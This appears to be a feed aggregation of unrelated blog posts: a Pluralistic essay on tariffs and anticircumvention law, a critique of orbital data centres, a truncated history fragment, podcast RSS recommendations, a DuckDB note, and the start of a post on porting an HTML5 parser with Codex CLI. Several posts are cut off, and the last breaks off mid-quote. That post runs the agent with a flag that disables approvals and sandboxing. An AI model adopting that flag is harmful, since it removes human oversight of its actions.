      <p>Today's links America's collapsing consumption is the world's disenshittification opportunity: America's loss is the post-American internet's gain. Hey look at this: Delights to delectate. Object permanence: DanKam; Backyard M*A*S*H; Blockchain voting is bullshit. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. America's collapsing consumption is the world's disenshittification opportunity (permalink) We are about to get a &quot;post-American internet,&quot; because we are entering a post-American era and a post-American world. Some of that is Trump's doing, and some of that is down to his predecessors. When we think about the American century, we rightly focus on America's hard power – the invasions, military bases, arms exports, and CIA coups. But it's America's soft power that established and maintained true American dominance, the &quot;weaponized interdependence&quot; that Henry Farrell and Abraham Newman describe in their 2023 book The Underground Empire: <a href="https://pluralistic.net/2023/10/10/weaponized-interdependence/#the-other-swifties">https://pluralistic.net/2023/10/10/weaponized-interdependence/#the-other-swifties</a> As Farrell and Newman lay out, America established itself as more than a global power – it is a global platform. If you want to buy things from another country, you use dollars, which you keep in an account at the US Federal Reserve, and which you exchange using the US-dominated SWIFT system. If you want to transmit data across a border, chances are you're use a fiber link that makes its first landfall on the USA, the global center of the world's hub-and-spoke telecoms system. No one serious truly believed that these US systems were entirely trustworthy, but there was always an assumption that if the US were to instrumentalize (or, less charitably, weaponize) the dollar, or fiber, that they would do so subtly, selectively, and judiciously. Instead, we got the Snowden revelations that the US was using its position in the center of the world's fiber web to spy on pretty much every person in the world – lords and peasants, presidents and peons. Instead, we got the US confiscating Argentina's foreign reserves to pay back American vulture capitalists who bought distressed Argentine bonds for pennies on the dollar and then got to raid a sovereign nation's treasury in order to recoup a loan they never issued. Instead we saw the SWIFT system mobilized to achieve tactical goals from the War on Terror and Russia-Ukraine sanctions. These systems are now no longer trustworthy. It's as though the world's brakes have started to fail intermittently, but we are still obliged to drive down the road at 100mph, desperately casting about for some other way to control the system, and forced to rely on this critical, unreliable mechanism while we do: <a href="https://pluralistic.net/2025/11/26/difficult-multipolarism/#eurostack">https://pluralistic.net/2025/11/26/difficult-multipolarism/#eurostack</a> This process was well underway before Trump, but Trump's incontinent belligerence has only accelerated the process – made us keenly aware that a sudden stop might be in our immediate future, heightening the urgency of finding some alternative to America's faulty brakes. Through trade policy (tariffs) and rhetoric, Trump has called the question: <a href="https://archive.is/WAMWI">https://archive.is/WAMWI</a> One of the most urgent questions Trump has forced the world to confront is what we will do about America's control over the internet. By this, I mean both the abstract &quot;governance&quot; control (such as the fact that ICANN is a US corporation, subject to US government coercion), and the material fact that virtually every government, large corporation, small business and household keeps its data (files, email, records) in a US Big Tech silo (also subject to US government control). When Trump and Microsoft colluded to shut down the International Criminal Court by killing its access to Outlook and Office365 (in retaliation for the ICC issuing an arrest warrant for the génocidaire Benjamin Netanyahu), the world took notice. Trump and Microsoft bricked the ICC, effectively shuttering its operations. If they could do that to the ICC, they could do it to any government agency, any nationally important corporation, any leader – anyone. It was an act of blatant cyberwarfare, no different from Russian hackers bricking Ukrainian power plants (except that Microsoft didn't have to hack Outlook, they own it). The move put teeth into Trump's frequent reminders that America no longer has allies or trading partners – it only has rivals and adversaries. That has been the subtext – and overt message – of the Trump tariffs, ever since &quot;liberation day&quot; on April 2, 2025. When Americans talk about the Trump tariffs, they focus on what these will do to the cost of living in the USA. When other countries discuss the tariffs, they focus on what this will do to their export markets, and whether their leaders will capitulate to America's absurd demands. This makes sense: America is gripped by a brutal cost of living crisis, and contrary to Trump's assertions, this is not a Democratic hoax. We know this because (as The Onion points out), &quot;Democrats would never run on a salient issue&quot;: <a href="https://theonion.com/fact-checking-trump-on-affordability/">https://theonion.com/fact-checking-trump-on-affordability/</a> It also makes sense that Canadians and Britons would focus on this because Prime Ministers Carney and Starmer have caved on their plans to tax US Big Tech, ensuring that these companies will always have a cash-basis advantage over domestic rivals (Starmer also rolled over by promising to allow American pharma companies to gouge the NHS): <a href="https://www.independent.co.uk/news/uk/politics/nhs-drug-prices-starmer-trump-tariffs-b2841490.html">https://www.independent.co.uk/news/uk/politics/nhs-drug-prices-starmer-trump-tariffs-b2841490.html</a> But there's another, highly salient aspect to tariffs that is much neglected – one that is, ultimately, far more important than these short-run changes to other countries' plans to tax American tech giants. Namely: for decades, the US has used the threat of tariffs to force its trading partners into policies that keep their tech companies from competing with American tech giants. The most important of these Big Tech-defending policy demands is something called &quot;anticircumvention law.&quot; This is a law that bans changing how a product works without the manufacturer's permission: for example, modifying your printer so it can use generic ink, or modifying your car so it can be fixed by an independent repair depot, or modifying your phone or games console so it can use a third-party app store. This ban on modification means that when a US tech giant uses its products to steal money and/or private information from the people in your country (that is, &quot;enshittification&quot;), no one is allowed to give your people the tools to escape these scams. Your domestic investors can't invest in your domestic technologists' startups, which cannot make the disenshittifying products that also cannot be exported globally, to anyone with an internet connection and a payment method. It's a double whammy: your people are plundered, and your businesses are strangled. The whole world has been made poorer, to the tune of trillions of dollars, by this scam. And the only reason everyone puts up with it is that the US threatened them with tariffs if they didn't. So now we have tariffs, and if someone threatens to burn your house down unless you follow orders, and then they burn it down anyway, you really don't have to keep following their orders. This is a point I've been making in many forums lately, including, most recently, on a stage in Canada, where I made the case that rather than whacking Americans with retaliatory tariffs, Canada should legalize reverse-engineering and go into business directly attacking the highest margin lines of business of America's most profitable corporations, making everything in Canada cheaper and better, and turning America's trillions in Big Tech ripoffs into Canadian billions by selling these tools to everyone else in the world: <a href="https://pluralistic.net/2025/11/28/disenshittification-nation/#post-american-internet">https://pluralistic.net/2025/11/28/disenshittification-nation/#post-american-internet</a> There's lots of reasons to like this plan. Not only is it a double reverse whammy – making everything cheaper and making billions for a new, globally important domestic tech sector – but it's also unambiguously within Canada's power to do. After all, it's very hard to get American tech giants to do things they don't want to do. Canada tried to do this with Facebook, and failed miserably: <a href="https://www.cbc.ca/radio/podcastnews/understood-who-broke-the-internet-episode-4-transcript-1.7615096">https://www.cbc.ca/radio/podcastnews/understood-who-broke-the-internet-episode-4-transcript-1.7615096</a> The EU – a far more powerful entity than Canada – has been trying to get Apple to open up its App Store, and Apple has repeatedly told them to go fuck themselves: <a href="https://pluralistic.net/2025/09/26/empty-threats/#500-million-affluent-consumers">https://pluralistic.net/2025/09/26/empty-threats/#500-million-affluent-consumers</a> Apple, being a truly innovative company, has come up with a whole lot of exciting new ways to tell the EU to fuck itself: <a href="https://www.theregister.com/2025/12/16/apple">https://www.theregister.com/2025/12/16/apple</a>_dma_complaint/ But anticircumvention law is something that every government has total, absolute control over. Maybe Canada can't order Apple, Google and Facebook to pay their taxes, but it can absolutely decide to stop giving these American companies access to Canada's courts to shut down Canadian competitors so that US companies can go on stealing data and money from the Canadian people: <a href="https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack">https://pluralistic.net/2025/11/01/redistribution-vs-predistribution/#elbows-up-eurostack</a> Funnily enough, this case is so convincing that I've started to hear from Canadian Trump appeasers who insist that we must not repeal our anticircumvention laws because this would work too well. It would inflict too much pain on America's looting tech sector, and save Canadians too much money, and make too much money for Canadian tech businesses. If Canada becomes the world's first disenshittification nation (they say), we will make Trump too angry. Apparently, these people think that Canada should confine its tariff response to measures that don't work, because anything effective would provoke Trump. When I try to draw these critics out about what the downside of &quot;provoking Trump&quot; is, they moot the possibility that Trump would roll tanks across the Rainbow Bridge and down Lundy's Lane. This seems a remote possibility to me – and ultimately, they agree. The international response to Trump invading Canada because we made it easier for people (including Americans) to buy cheap printer ink would be…intense. Next, they mumble something about tariffs. When I point out that the US is already imposing tariffs on Canadian exports, they say &quot;well, it could be worse,&quot; and point to various moments when Trump has hiked the tariffs on Canada, e.g. because he was angry over being reminded that Ronald Reagan would have hated his guts: <a href="https://www.youtube.com/watch?v=dCKmMEFiLrI">https://www.youtube.com/watch?v=dCKmMEFiLrI</a> But of course, the fact that Trump's tariffs yo-yo up and down depending on the progress of his white matter disease means that anyone trying to do forward planning for something they anticipate exporting to America should assume that there might be infinity tariffs the day they load up their shipping container. But there's another way in which the threat of tariffs is ringing increasingly hollow: American consumption power is collapsing, because billionaires and looters have hoarded all the country's wealth, and no one can afford to buy things anymore. America is in the grips of its third consecutive &quot;K-shaped recovery&quot;: <a href="https://prospect.org/2025/12/01/premiumization-plutonomy-middle-class-spending-gilded-age/">https://prospect.org/2025/12/01/premiumization-plutonomy-middle-class-spending-gilded-age/</a> A K-shaped recovery is when the richest people get richer, but everyone else gets worse off. Working people in America have gotten steadily poorer since the 1970s, even as America's wealthiest have seen their net worth skyrocket. The declining economic power of everyday Americans has multiple causes: stagnating wages, monopoly price-gouging, and the blistering increase in education, housing and medical debt. These all have the same underlying cause, of course: the capture of both political parties – and the courts and administrative agencies – by billionaires, who have neutered antitrust law, jacked up the price of health care and a college educaton, smashed unions, and cornered entire housing markets. For decades, America's consumption power has been kept on life-support through consumer debt and second (or third, or fourth) mortgages. But America's monopoly credit card companies are every bit as capable of price-gouging as America's hospitals, colleges and landlords are, and Americans don't just carry more credit-card debt than their foreign counterparts, they also pay more to service that debt: <a href="https://www.justice.gov/archives/opa/pr/justice-department-sues-visa-monopolizing-debit-markets">https://www.justice.gov/archives/opa/pr/justice-department-sues-visa-monopolizing-debit-markets</a> The point is that every dollar that goes into servicing a debt is a dollar that can't be used to buy something useful. A dollar spent on consumption has the potential to generate multiple, knock-on transactions, as the merchant spends your dollar on a coffee, and the coffee-shop owner spends it on a meal out, and the restaurateur spends it on a local printer who runs off a new set of menus. But a dollar that's shoveled into the debt markets is almost immediately transferred out of the real economy and into the speculative financial economy, landing in the pocket of a one-percenter who buys stocks or other assets with it. The rich just don't buy enough stuff. There's a limit to how many Lambos, Picassos, and Sub-Zero fridges even the most guillotineable plute can usefully own. Meanwhile, consumers keep having their consumption power siphoned off by debt-collectors and price-gougers, with Trump's help. The GOP just forced eight million student borrowers back into repayment: <a href="https://prospect.org/2025/12/16/gop-forcing-eight-million-student-loan-borrowers-into-repayment/">https://prospect.org/2025/12/16/gop-forcing-eight-million-student-loan-borrowers-into-repayment/</a> They've killed a monopolization case against Pepsi and Walmart for colluding to rig grocery prices across the entire economy: <a href="https://www.thebignewsletter.com/p/secret-documents-show-pepsi-and-walmart">https://www.thebignewsletter.com/p/secret-documents-show-pepsi-and-walmart</a> They've sanctioned the use of price-fixing algorithms to raise rent: <a href="https://www.thebignewsletter.com/p/an-odd-settlement-on-rent-fixing">https://www.thebignewsletter.com/p/an-odd-settlement-on-rent-fixing</a> As Tim Wu points out in his new book, The Age of Extraction, one consequence of allowing monopoly pricing is that it reduces spending power across the entire economy: <a href="https://www.penguinrandomhouse.com/books/691177/the-age-of-extraction-by-tim-wu/">https://www.penguinrandomhouse.com/books/691177/the-age-of-extraction-by-tim-wu/</a> Take electricity: you would probably pay your power bill even if it tripled. Sure, you'd find ways to conserve electricity and eliminate many discretionary power uses, but anyone who can pay for electricity will, if the alternative is no electricity. Electricity – like health, shelter, food, and education – is so essential that you'd forego a vacation, a new car, Christmas gifts, dinners out, a new winter coat, or a vet's visit for your cat if that was the only way to keep the lights on. Trump's unshakable class solidarity with rent extractors, debt collectors and price gougers has significantly accelerated the collapse of the consumption power of Americans (AKA &quot;the affordability crisis&quot;). But it gets worse: Americans' consumption power isn't limited to the dollars they spend, it also includes the dollars that the government spends on their behalf, through programs like SNAP (food stamps) and Medicaid/Medicare. Those programs have been slashed to the bone and beyond by Trump, Musk, DOGE and the Republican majority in Congress and the Senate. The reason that other countries took the threat of US tariffs so seriously – seriously enough to hamstring their own tech sector and render their own people defenseless against US tech – is that the US has historically bought a lot of stuff. For any export economy, the US was a critical market, a must-have. But that has been waning for a generation, as the Lambo-and-Sub-Zero set hoarded more and more of the wealth and the rest of us were able to afford less and less. In less than a year, Trump has slashed the consumption power of an increasing share of the American public to levels approaching the era of WWII ration-books. The remaining American economy is a collection of cheap gimmicks that are forever on the brink of falling apart. Most of the economy is propped up by building data-centers for AI that no one wants and that can't be powered thanks to Trump's attacks on renewables. The remainder consists of equal parts MLMs, Labubus, Lafufus, cryptocurrency speculation, and degenerate app-based gambling. None of this is good. This is all fucking terrible. But I raise it here to point out that &quot;Do as I say or Americans won't buy your stuff anymore&quot; starts to ring hollow once most Americans can't afford to buy anything anymore. America is running out of levers to pull in order to get the rest of the world to do its bidding. American fossil fuels are increasingly being outcompeted by an explosion of cheap, evergreen Chinese solar panels, inverters, batteries, and related technology: <a href="https://pluralistic.net/2025/10/02/there-goes-the-sun/#carbon-shifting">https://pluralistic.net/2025/10/02/there-goes-the-sun/#carbon-shifting</a> And the US can't exactly threaten to withhold foreign aid to get leverage over other countries – US foreign aid has dropped to homeopathic levels: <a href="https://www.factcheck.org/2025/02/sorting-out-the-facts-on-waste-and-abuse-at-usaid/">https://www.factcheck.org/2025/02/sorting-out-the-facts-on-waste-and-abuse-at-usaid/</a> What's more, it's gonna be increasingly difficult for the US to roll tanks anywhere, even across the Rainbow Bridge, now that Pete Hegseth is purging the troops of anyone who can't afford Ozempic: <a href="https://www.militarytimes.com/news/pentagon-congress/2025/09/30/hegseth-blasts-fat-troops-in-rare-gathering-with-military-brass/">https://www.militarytimes.com/news/pentagon-congress/2025/09/30/hegseth-blasts-fat-troops-in-rare-gathering-with-military-brass/</a> And Congress just gutted the US military's Right to Repair, meaning that the Pentagon will be forced to continue its proud tradition of shipping busted generators, vehicles and materiel back to the USA for repair: <a href="https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/">https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/</a> Eventually, some foreign government is going to wake up to the fact that they can make billions by raiding the US tech giants that have been draining their economy, and, in so doing, defend themselves against Trump's cyberwar threat to order Microsoft (or Oracle, or Apple, or Google) to brick their key ministries and corporations. When they do, US Big Tech will squeal, the way they always do: <a href="https://economicpopulist.substack.com/p/big-tech-zeal-to-weaponize-trade">https://economicpopulist.substack.com/p/big-tech-zeal-to-weaponize-trade</a> But money talks and bullshit walks. There's a generation of shit-hot technologists who've been chased out of America by mask-wearing ICE goons who wanted to throw them in a gulag, and a massive cohort of investors looking for alpha who don't want to have to budget for a monthly $TRUMP coin spend in order to remain in business. And when we do finally get a disenshittification nation, it will be great news for Americans. After all, everyday Americans either own no stock, or so little stock as to be indistinguishable from no stock. We don't benefit from US tech companies' ripoffs – we are the victims of those ripoffs. America is ground zero for every terrible scam and privacy invasion that a US tech giant can conceive of. No one needs the disenshittification tools that let us avoid surveillance, rent-seeking and extraction more than Americans. And once someone else goes into business selling them, we'll be able to buy them. Buying digital tools that are delivered over the internet is a hell of a lot simpler than buying cheap medicine online and getting it shipped from a Canadian pharmacy. For an America First guy, Trump is sure hell-bent on ending the American century.

The AI bubble has been kept inflated by journalists uncritically reporting whatever CEOs say as they frantically pump the stock. Right now, you can observe a wonderful example of this by searching the Web for &quot;orbital data centers&quot;. My recent search turned up pages of links, including <a href="https://www.bloomberg.com/news/articles/2025-12-11/spacex-1-5-trillion-value-target-hinges-on-starlink-and-elon"><em>SpaceX’s Lofty IPO Valuation Hinges on Big Bet on Outsize Growth</em></a> from Bloomberg's Bailey Lipschultz, Sana Pashankar, and Loren Grush:</p>
<blockquote>
<p>To buy into SpaceX’s audacious $1.5 trillion valuation in a listing next year, investors will need to have faith in Elon Musk’s equally galactic vision for his rocket and satellite maker, from orbital data centers to lunar factories to human settlements on Mars.</p>
</blockquote>
<p>I chose one that ought to be more credible than Musk from <em>Scientific American</em>. Jeremy Hsu's <a href="https://www.scientificamerican.com/article/data-centers-in-space/"><em>Data Centers in Space Aren’t as Wild as They Sound</em></a> reports that:</p>
<blockquote>
<p>In early November Google announced Project Suncatcher, which aims to launch solar-powered satellite constellations carrying its specialty AI chips, with a demonstration mission planned for 2027. Around the same time, the start-up Starcloud celebrated the launch of a 60-kilogram satellite with an NVIDIA H100 GPU as a prelude to an orbital data center that is expected to require five gigawatts of electric power by 2035.</p>
</blockquote>
<p>To do Hsu justice, he did point out a few of the problems. But follow me below the fold for more.</p>
<p>A couple of weeks ago an anonymous engineer posted <a href="https://taranis.ie/datacenters-in-space-are-a-terrible-horrible-no-good-idea/"><em>Datacenters in space are a terrible, horrible, no good idea</em></a>:</p>
<blockquote>
<p>In the interests of clarity, I am a former NASA engineer/scientist with a PhD in space electronics. I also worked at Google for 10 years, in various parts of the company including YouTube and the bit of Cloud responsible for deploying AI capacity, so I'm quite well placed to have an opinion here.</p>
<p>The short version: this is an absolutely terrible idea, and really makes zero sense whatsoever. There are multiple reasons for this, but they all amount to saying that the kind of electronics needed to make a datacenter work, particularly a datacenter deploying AI capacity in the form of GPUs and TPUs, is exactly the opposite of what works in space. If you've not worked specifically in this area before, I'll caution against making gut assumptions, because the reality of making space hardware actually function in space is not necessarily intuitively obvious.</p>
</blockquote>
<p>You should absolutely read the whole thing, it is magnificent. I don't have this background, but I don't need it to know that they are a terrible idea. All I need is arithmetic.</p>
<p>Steven Clark reports that <a href="https://arstechnica.com/science/2025/12/investors-commit-quarter-billion-dollars-to-startup-designing-giga-satellites/"><em>Investors commit quarter-billion dollars to startup designing “Giga” satellites</em></a>:</p>
<blockquote>
<p>K2 is designing two classes of satellites—Mega and Giga .... The company’s first “Mega Class” satellite is named Gravitas. Gravitas will also deploy twin solar arrays capable of generating 20 kilowatts of power.</p>
<p>...</p>
<p>K2 says Gravitas is “on par with the largest satellites that have ever been produced.” But K2 won’t stop there. The firm’s next satellite iteration, known as Giga, .... Underpinning Giga is its ability to generate up to 100 kilowatts of power per satellite ... Examples of missions Giga can support include AI computing</p>
</blockquote>
<p>Gravitas can launch on a Falcon 9, but Giga-class satellites need Starship. In <a href="https://www.theregister.com/2025/11/15/power_supercomputing/"><em>Power: The answer to and source of all your AI datacenter problems</em></a> Tobias Mann reports that:</p>
<blockquote>
<p>Today, Nvidia's rack systems are hovering around 140kW in compute capacity. But we've yet to reach a limit. By 2027, Nvidia plans to launch 600kW racks which pack 576 GPU dies into the space once occupied by just 32.</p>
</blockquote>
<p>So the largest satellites ever can power 14% of a current Nvidia rack. The next generation that requires Starship to launch can power 70% of a current Nvidia rack. By the time they can launch it, it will power 17% of a contemporary Nvidia rack. See, progress!</p>
<p>Starcloud's &quot;5GW&quot; satellite could power over 8000 2027 Nvidia racks in 2035 but it would be 50,000 times larger than a satellite that is much larger than one &quot;on par with the largest satellites that have ever been produced&quot;.</p>
<p>The next question is &quot;How many racks does one data center hold?&quot; Yasir Shinaishin of ABB wrote in<a href="https://electrification.us.abb.com/sites/default/files/2024-07/5874-ABB_RackDensity_Article_BMF_1.0-1.pdf"><em>New Strategies in Design to Meet the Demands of AI Data Centers</em></a>:</p>
<blockquote>
<p>It is not uncommon to see data centers of 1 GW with liquid-cooled racks with densities over 100 kW.</p>
</blockquote>
<p>Say 7,000 current Nvidia racks. So they need 10,000 Giga-class satellites to match one 2025 data center. Lets say they start launching in 2027 and launch 100 satellites/year. They can match one 2025 data center in 2127. Maybe the AI bubble will have burst by then...</p>

But the useful life of the racks in earth-bound data centers is <a href="https://blog.dshr.org/2025/10/depreciation.html">less that 5 years</a>. In space the chips are subject to high levels of radiation, which as the anonymous engineer explains, is <a href="https://taranis.ie/datacenters-in-space-are-a-terrible-horrible-no-good-idea/">bad news</a>:</p>
<blockquote>
<p>For longer duration missions, which would be the case with space based datacenters because they would be so expensive that they would have to fly for a long time in order to be economically viable, it's also necessary to consider total dose effects. Over time, the performance of chips in space degrades, because repeated particle impacts make the tiny field-effect transistors switch more slowly and turn on and off less completely. In practice, this causes maximum viable clock rates to decay over time, and for power consumption to increase.</p>
</blockquote>
<p>But lets ignore that and asume a useful life of 5 years. Thus to keep one 2025 data center operating in space they need to launch 2000 enormous satellites per year, or over <em>5 per day</em>. It is true that solar power in space is free, but launches aren't. Adding the cost of 10,000 launches to the cost of replacing the 60% of the cost of the data center that is the racks is going to make the already impossible <a href="https://blog.dshr.org/2025/12/mind-gaap.html">economics of AI</a> orders of magnitude worse.</p>
<p>That is not to mention that they will be burning vast amounts of fuel and burning up more than 5 huge satellites a day in the upper atmosphere, which would cause vastly more pollution and damage to the ozone layer than described in <a href="https://www.nature.com/articles/s41597-024-03910-z"><em>Global 3D rocket launch and re-entry air pollutant and CO2 emissions at the onset of the megaconstellation era</em></a> by Barker <em>et al</em> or <a href="https://www.nature.com/articles/s41612-025-01098-6"><em>Near-future rocket launches could slow ozone recovery</em></a> by Revell <em>et al</em>.</p>

<p>But even that isn't the biggest problem. In <a href="https://arxiv.org/abs/2512.09643"><em>An Orbital House of Cards: Frequent Megaconstellation Close Conjunctions</em></a> Thiele <em>et al</em> show that we are close to the <a href="https://en.wikipedia.org/wiki/Kessler_syndrome">Kessler syndrome</a>:</p>
<blockquote>
<p>Here we propose a new metric, the CRASH Clock, that measures such stress in terms of the time it takes for a catastrophic collision to occur if there are no collision avoidance manoeuvres or there is a severe loss in situational awareness. Our calculations show the CRASH Clock is currently 2.8 days, which suggests there is now little time to recover from a wide-spread disruptive event, such as a solar storm. This is in stark contrast to the pre-megaconstellation era: in 2018, the CRASH Clock was 121 days.</p>
</blockquote>
<p>Co-author Prof. Lawler <a href="https://mastodon.social/@sundogplanets/115701447682658918">wrote</a>:</p>
<blockquote>
<p>One of the scariest parts of this project was learning more about Starlink's orbital operations. I had always assumed they had some kind of clever configuration of the satellites in the orbital shell that minimized conjunctions, and we would see the number of conjunctions grow over time in our simulations. But no! It's just random! There's no magic here, it's just avoiding collisions by moving a Starlink satellite every 2 minutes. This is bad.</p>
</blockquote>
<p>Even if we haven't rendered low earth orbit unusable in the next few years, a constellation of 10,000 huge satellites in low earth orbit would rapidly self-destruct and guarantee humanity lost access to space.</p>
<p>What are these investors smoking?</p>

      <p>American presidents occasionally perform roles that extend well beyond the formal obligations of their office. Thomas Jefferson’s tenure (1801–1809) embodied the broader progress of antebellum southern agrarian power, while Abraham Lincoln’s term (1861–1865) anticipated the growth of postbellum northern industrial</p>

      <p>Maureen has written <a href="https://htmhell.dev/adventcalendar/2025/14/">a really good overview of web feeds</a> for this year’s HTMHell advent calendar.</p>
<p>The common belief is that nobody uses RSS feeds these days. And while it’s true that I wish more people used feed readers— <a href="https://www.citationneeded.news/curate-with-rss/">the perfect antidote to being fed from an algorithm</a>—the truth is that millions of people use RSS feeds every time they listen to a podcast. That’s what a podcast is: an RSS feed with <code>enclosure</code> elements that point to audio files.</p>
<p>And just as a web feed doesn’t necessarily need to represent a list of blog posts, a podcast doesn’t necessarily need to be two or more people having a recorded conversation (though that does seem to be the most common format). A podcast can tell a story. I like those kinds of podcasts.</p>
<p>The BBC are particularly good at this kind of episodic audio storytelling. I really enjoyed their series <a href="https://www.bbc.co.uk/programmes/p083t547">Thirteen minutes to the moon</a>, all about the Apollo 11 mission. They followed it up with <a href="https://www.bbc.co.uk/programmes/p083wp70">a series on Apollo 13</a>, and most recently, <a href="https://www.bbc.co.uk/programmes/p0lq7254">a series on the space shuttle</a>.</p>
<p><a href="https://podcasts.files.bbci.co.uk/w13xttx2.rss">Here’s the RSS feed for the 13 minutes podcast</a>.</p>
<p>Right now, the BBC have an ongoing series about <a href="https://www.bbc.co.uk/programmes/p08llv8n/episodes/downloads">the history of the atomic bomb</a>. The first series was about Leo Szilard, the second series was about Klaus Fuchs, and the third series running right now is about the Cuban missile crisis.</p>
<p>The hook is that each series is presented by people with a family connection to the events. The first series is presented by the granddaughter of one of the Oak Ridge scientists. The second series is presented by the granddaughter of Klaus Fuch’s spy handler in the UK—blimey! And the current series is presented by Nina Khrushcheva and Max Kennedy—double blimey!</p>
<p><a href="https://podcasts.files.bbci.co.uk/p08llv8n.rss">Here’s the RSS feed for The Bomb podcast</a>.</p>
<p>If you want a really deep dive into another pivotal twentieth century event, Evgeny Morozov made a podcast all about Stafford Beer and Salvadore Allende’s collaboration on cybernetics in Chile, the fabled <a href="https://en.wikipedia.org/wiki/Project_Cybersyn">Project Cybercyn</a>. It’s fascinating stuff, though there’s an inevitable feeling of dread hanging over events because we know how this ends.</p>
<p>The podcast is called <a href="https://www.the-santiago-boys.com/">The Santiago Boys</a>, though I almost hesitate to call it a podcast because for some reason, the website does its best to hide the RSS feed, linking only to the silos of Spotify and Apple. Fortunately, thanks to <a href="https://getrssfeed.com/">this handy tool</a>, I can say:</p>
<p><a href="https://feeds.megaphone.fm/BCS4655242240">Here’s the RSS feed for The Santiago Boys podcast</a>.</p>
<p>The unifying force behind all three of these stories is the cold war:</p>
<ul>
<li><a href="https://www.bbc.co.uk/programmes/w13xttx2">13 Minutes</a>—the space race, from the perspective of the United States.</li>
<li><a href="https://www.bbc.co.uk/programmes/p08llv8n">The Bomb</a>—the nuclear arms race, from Los Alamos to Cuba.</li>
<li><a href="https://www.the-santiago-boys.com/">The Santiago Boys</a>—the CIA-backed overthrow of a socialist democracy in Chile.</li>

(date: 2025-12-16)
      <p>
      <h1>Adieu Apache Derby, Welcome DuckDB</h1>
<p>Apache Derby was once a popular system to mock an SQL-Engine during unit tests. A use-case that vanished by the ease of which “the real SQL systems” are available during development nowadays. Thus, the following note might be sad, but nor surprising: “ <a href="https://db.apache.org/derby/">On 2025-10-10, the Derby developers voted to retire the project into a read-only state. Derby development and bug-fixing have ended. No further releases will be published</a>”. Consequently, I’ve removed Apache Derby from the charts on <a href="https://modern-sql.com/">modern-sql.com</a>.</p>
<p>As every end is a new beginning <a href="https://modern-sql.com/">modern-sql.com</a> now covers <a href="https://duckdb.org/">DuckDB</a> instead. DuckDB is an in-process System that aims at analytic workloads on commodity hardware such as your laptop computer. DuckDB is often praised for its ease of use and its capability to use all CPU cores of the system it is running on. That is quite often enough scalability. In particular, when different uses have copies of the database locally on their computer. If that sounds reasonably to you, you might want to give <a href="https://duckdb.org/">DuckDB</a> a try.</p>
<p>Just because I can I’m also putting the chart about the <a href="https://modern-sql.com/caniuse/merge"><code>merge</code> statement</a> here (introduced with DuckDB 1.4, as you can see below).</p>

      <h1>I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours</h1>

(date: 2025-12-15)
      <p>
      <p>I <a href="https://simonwillison.net/2025/Dec/14/justhtml/">wrote about JustHTML yesterday</a> - Emil Stenström's project to build a new standards compliant HTML5 parser in pure Python code using coding agents running against the comprehensive html5lib-tests testing library. Last night, purely out of curiosity, I decided to try <strong>porting JustHTML from Python to JavaScript</strong> with the least amount of effort possible, using Codex CLI and GPT-5.2. It worked beyond my expectations.</p>
<h4>TL;DR</h4>
<p>I built <a href="https://github.com/simonw/justjshtml">simonw/justjshtml</a>, a dependency-free HTML5 parsing library in JavaScript which passes 9,200 tests from the html5lib-tests suite and imitates the API design of Emil's JustHTML library.</p>
<p>It took two initial prompts and a few tiny follow-ups. <a href="https://simonwillison.net/2025/Dec/11/gpt-52/">GPT-5.2</a> running in <a href="https://github.com/openai/codex">Codex CLI</a> ran uninterrupted for several hours, burned through 1,464,295 input tokens, 97,122,176 cached input tokens and 625,563 output tokens and ended up producing 9,000 lines of fully tested JavaScript across 43 commits.</p>
<p>Time elapsed from project idea to finished library: about 4 hours, during which I also bought and decorated a Christmas tree with family and watched the latest Knives Out movie.</p>
<h4>Some background</h4>
<p>One of the most important contributions of the HTML5 specification ten years ago was the way it precisely specified how <em>invalid</em> HTML should be parsed. The world is full of invalid documents and having a specification that covers those means browsers can treat them in the same way - there's no more &quot;undefined behavior&quot; to worry about when building parsing software.</p>
<p>Unsurprisingly, those invalid parsing rules are pretty complex! The free online book <a href="https://htmlparser.info/">Idiosyncrasies of the HTML parser</a> by Simon Pieters is an excellent deep dive into this topic, in particular <a href="https://htmlparser.info/parser/">Chapter 3. The HTML parser</a>.</p>
<p>The Python <a href="https://github.com/html5lib/html5lib-python">html5lib</a> project started the <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> repository with a set of implementation-independent tests. These have since become the gold standard for interoperability testing of HTML5 parsers, and are used by projects such as <a href="https://github.com/servo/servo">Servo</a> which used them to help build <a href="https://github.com/servo/html5ever">html5ever</a>, a &quot;high-performance browser-grade HTML5 parser&quot; written in Rust.</p>
<p>Emil Stenström's <a href="https://github.com/EmilStenstrom/justhtml">JustHTML</a> project is a pure-Python implementation of an HTML5 parser that passes the full html5lib-tests suite. Emil <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/">spent a couple of months</a> working on this as a side project, deliberately picking a problem with a comprehensive existing test suite to see how far he could get with coding agents.</p>
<p>At one point he had the agents rewrite it based on a close inspection of the Rust html5ever library. I don't know how much of this was direct translation versus inspiration (here's Emil's <a href="https://news.ycombinator.com/item?id=46264195#46267059">commentary on that</a>) - his project has 1,215 commits total so it appears to have included a huge amount of iteration, not just a straight port.</p>
<p>My project <strong>is</strong> a straight port. I instructed Codex CLI to build a JavaScript version of Emil's Python code.</p>
<h4>The process in detail</h4>
<p>I started with a bit of mise en place. I checked out two repos and created an empty third directory for the new project:</p>
<pre><code>cd ~/dev
git clone https://github.com/EmilStenstrom/justhtml
git clone https://github.com/html5lib/html5lib-tests
mkdir justjshtml
cd justjshtml
</code></pre>
<p>Then I started Codex CLI for GPT-5.2 like this:</p>
<pre><code>codex --yolo -m gpt-5.2
</code></pre>
<p>That <code>--yolo</code> flag is a shortcut for <code>--dangerously-bypass-approvals-and-sandbox</code>, which is every bit as dangerous as it sounds.</p>
<p>My first prompt told Codex to inspect the existing code and use it to build a specification for the new JavaScript library:</p>
<blockquote>
